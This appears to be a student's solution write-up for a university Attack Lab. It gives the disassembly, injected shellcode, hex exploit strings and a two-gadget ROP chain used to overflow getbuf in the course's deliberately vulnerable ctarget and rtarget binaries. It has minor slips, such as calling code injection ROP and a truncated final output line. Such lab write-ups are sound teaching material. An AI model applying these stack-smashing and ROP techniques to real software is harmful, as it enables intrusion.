# Attack Lab

## `Learning Materials`

[attacklab.pdf](Attack%20Lab%201321ab65f22f803f88abf2d8596807d8/attacklab.pdf)

# Information

## Contents in this lab

`README.txt`: A file describing the contents of the directory

`ctarget`: An executable program vulnerable to code-injection attacks

`rtarget`: An executable program vulnerable to return-oriented-programming attacks

`cookie.txt`: An 8-digit hex code that you will use as a unique identifier in your attacks.

`farm.c`: The source code of your target’s “gadget farm,” which you will use in generating return-orientedprogramming attacks.

`hex2raw`: A utility to generate attack strings.

## Key Points

1. **Function `getbuf` and Buffer Overflow Vulnerability**:
    - Both `CTARGET` and `RTARGET` use the `getbuf` function, which reads a string into a buffer (`buf`) without checking its length, allowing for buffer overflow.
2. **Behavior with Short and Long Inputs**:
    - If the input string is short, `getbuf` will return 1 and proceed normally.
    - If the string is too long, it may cause a segmentation fault due to stack corruption from buffer overflow.
3. **Command-Line Arguments for Target Programs**:
    - `h`: Displays the list of possible command-line arguments.
    - `q`: Disables sending results to the grading server.
    - `i FILE`: Supplies input from a file instead of standard input.
4. **Constructing Attack Strings with `HEX2RAW`**:
    - `HEX2RAW` can generate raw strings from hexadecimal values, useful for constructing attack strings with non-ASCII bytes.
    - Avoid using byte value `0x0a` (newline) within attack strings, as it terminates the string in `Gets`.
5. **Automatic Validation Upon Success**:
    - When an attack string works correctly, the target program will automatically send a notification to the grading server for validation.

# Level 1

All the information you need to devise your exploit string for this level can be determined by examining a disassembled version of `CTARGET`. 

Use `objdump -d` to get this dissembled version.

The idea is to position a byte representation of the starting address for `touch1` so that the retinstruction at the end of the code for getbuf will transfer control to `touch1`.

Be careful about byte ordering.

You might want to use GDB to step the program through the last few instructions of `getbuf` to make sure it is doing the right thing.

The placement of `buf` within the stack frame for `getbuf` depends on the value of compile-time constant BUFFER_SIZE, as well the allocation strategy used by GCC. You will need to examine the disassembled code to determine its position.

## Solution

1. Use `objdump -d ctarget > ctarget.s` to get the code
2. Use search to find the `getbuf` function

```nasm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret    
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

1. Find the `touch1` function

```nasm
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	call   400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	call   401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	call   400e40 <exit@plt>
```

1. we can see the address is `00000000004017c0` , and the stack places created by the `getbuf` function is `0x28`bytes , `0x28` is 40, so the address of `touch1` should be put at [40-48.](http://40-48.So) So the answer should be (Note that little-endian format is used, so the address should be written in reverse order):

```nasm
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00 
```

1. put the answer in a txt file called `answer1.txt`
2. use `./hex2raw < exploit.txt > answer1.txt`
3. use `./ctarget -i answer1.txt -q` to execute the program.
4. show the pass message

```nasm
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 
```

# Level 2

- Position a byte representation of the address of your injected code so that the `ret` instruction at the end of the `getbuf` function transfers control to it.
- Recall that the first argument to a function is passed in the `%rdi` register.
- Your injected code should:
    - Set the `%rdi` register to your cookie.
    - Use a `ret` instruction to transfer control to the first instruction in `touch2`.
- Do **not** attempt to use `jmp` or `call` instructions in your exploit code. The encodings of destination addresses for these instructions are difficult to formulate.
- Use `ret` instructions for all transfers of control, even when you are not returning from a call.
- Refer to Appendix B for guidance on using tools to generate the byte-level representations of instruction sequences.

## Solutions

1. find the `touch2` function, we can see the address is `00000000004017ec` ,but we also need to send a argument to touch2, and the argument is in `cookie.txt` `0x59b997fa` .

```nasm
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38>
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	call   400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	call   401c8d <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	call   400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	call   401d4f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	call   400e40 <exit@plt>
```

1. This is called ***Return-Oriented Programming (ROP)***, we need a code to let the original program to return to the wrong address so that we can do what we want.
2. Write a program that puts the cookie value in the`%rdi`register, pushes the address of`touch2`onto the stack (`%rsp`), and uses`ret`. The`ret`instruction will pop the top value from the stack into the instruction pointer, and do `sub $0x8, %rsp` effectively jumping to`touch2`. Here's the assembly code:

```nasm
movq $0x59b997fa, %rdi
pushq $0x4017ec
ret
```

1. use `*gcc -c touch2code.s*` and `*objdump -d touch2code.o > touch2code.d`* to find the machine code

```nasm
touch2code.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	push   $0x4017ec
   c:	c3                   	ret    
```

1. **To execute this code, we need to inject it into the buffer allocated by getbuf and modify the return address to point to the beginning of our injected code on the stack.(!!!!very difficult to understand, but very important!)**
2. Now we need to find the stack top of getbuf by using the gdb tool `run -q -i answer1.txt` and we can find the `%rsp` is `0x5561dc78`
3. so we need to put the return address of getbuf with `0x5561dc78` and put the touch2code in the getbuf input. so the result should be:

```nasm
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

1. use `./hex2raw < exploit2.txt > answer2.txt`
2. use `./ctarget -i answer2.txt -q` to execute the program.
3. show the pass message

```nasm
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
```

# Level 3

- **Objective**: Modify CTARGET to execute `touch3` instead of returning to `test`, making `touch3` think it received a string representation of your cookie as an argument.
- **Cookie Representation**: Include your cookie as an eight-digit hexadecimal string (most to least significant), without the "0x" prefix.
- **C String Format**: Remember that a C string ends with a null byte (0). You can check byte representations using the `man ascii` command in Linux.
- **Setting Register**: Your exploit should set register `%rdi` to point to the string representation of the cookie.
- **Memory Management**: Be cautious with where you place the cookie string, as the functions `hexmatch` and `strncmp` will overwrite parts of the stack, including the buffer used by `getbuf`.

## Solution

1. find the `touch3` function, we can see the address is `00000000004018fa` ,but we also need to send a argument to touch3, and the argument is the address of the string in `cookie.txt` `59b997fa` .
2. This is called ***Return-Oriented Programming (ROP)***, we need a code to let the original program to return to the wrong address so that we can do what we want.
3. **Preserving Address**: By placing the string address in the stack space before the return address of `getbuf`, you ensure that your string remains accessible even after the function has completed. This is crucial because the stack pointer (`rsp`) will point to the original stack frame when the function returns.
4. **Protection Against Overwriting**: When the subsequent functions (`hexmatch` and `strncmp`) operate on the stack, they may overwrite the space allocated for local variables in `getbuf`. If your string is placed below the return address in the stack, it risks being overwritten. Keeping it higher in the stack helps protect it from being modified by later function calls.(very important!!!!)
5. Write a program that put the address of the string in the cookie in the `%rdi` ,and we can see the `%rsp` is `0x5561dc78`after calling `getbuf`,so we need to add `0x28` and add `0x08`to get the address before the return address,  and push the address of `touch3` to the `%rsp` and return to it, so the code should be :

```nasm
movq $0x5561dca8, %rdi
pushq $0x4018fa
ret
```

1. use `*gcc -c touch3code.s*` and `*objdump -d touch3code.o > touch3code.d`* to find the machine code

```nasm

touch3code.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   7:	68 fa 18 40 00       	push   $0x4018fa
   c:	c3                   	ret     
```

1. **To execute this code, we need to inject it into the buffer allocated by getbuf and modify the return address to point to the beginning of our injected code on the stack.(!!!!very difficult to understand, but very important!)**
2. Now we need to find the stack top of getbuf by using the gdb tool `run -q -i answer1.txt` and we can find the `%rsp` is `0x5561dc78`
3. so we need to put the return address of getbuf with `0x5561dc78` and put the touch3code in the getbuf input. and we also need to put the hex code of the string in the address of `0x5561dca8` (attention!The string is not stored using little-endian format),so the result should be:

```nasm
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61 00
```

1. use `./hex2raw < exploit3.txt > answer3.txt`
2. use `./ctarget -i answer3.txt -q` to execute the program.
3. show the pass message

```nasm
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 
```

# Level4

- **Phase 4 Overview**: You will repeat the attack from Phase 2 on the RTARGET program using gadgets from your gadget farm.
- **Allowed Instructions**: You can use `movq`, `popq`, `ret`, and `nop` instructions, and only the first eight x86-64 registers (%rax–%rdi).
- **Gadget Sources**: All necessary gadgets can be found between the `start_farm` and `mid_farm` functions in the RTARGET code.
- **Minimal Gadget Requirement**: The attack can be performed using just two gadgets.
- **Data Management**: The use of `popq` means your exploit string will need to combine gadget addresses and the data being popped from the stack.
1. Use `objdump -d ctarget > rtarget.s` to get the code
2. Use search to find the `getbuf` function
3. However, because stack randomization is used, it's not feasible to carry out the attack in the same way as before.
4. so we if we want to use :
   
    ```nasm
    movq $0x59b997fa, %rdi
    pushq $0x4017ec
    ret
    ```
    
    we will find that the machine code is:
    
    ```nasm
    Disassembly of section .text:
    
    0000000000000000 <.text>:
       0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
       7:	68 ec 17 40 00       	push   $0x4017ec
       c:	c3                   	ret    
    ```
    
    IIt is impossible to find this exact machine code in the assembly of`rtargets.s`. Instead, we need to put the cookie value on the stack (`%rsp`), use`pop %rdi`to pass it to touch2, then put the address of touch2 on the stack and return to it.
    
    ```nasm
    pop %rdi
    ret
    ```
    
    However, later it was discovered that this instruction's `gadget` couldn't be found in the `farm`. After multiple attempts, it was necessary to use other registers for transfer, considering using two `gadgets`
    
    ```nasm
    popq %rax
    ret #to the address of the next instruction
    
    movq %rax, %rdi
    ret #to touch2
    ```
    
5. According to the instruction set reference, `pop %rax` is represented by `58`. Searching for `58` in the assembly code, we find:
   
    ```nasm
    00000000004019a7 <addval_219>:
      4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
      4019ad:       c3                      retq                   retq
    ```
    
    The instruction address is `0x4019ab`.
    
    `movq %rax, %rdi` is represented by `48 89 c7`. We can find an exact match! (Note: `90` represents a "nop" instruction and can be ignored)
    
    ```nasm
    00000000004019c3 <setval_426>:
      4019c3:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
      4019c9:       c3                      retq
    ```
    
    The instruction address is `0x4019c5`.
    
6. so the result should be 

```nasm
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

1. test and get the pass message

```nasm
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 0
```

---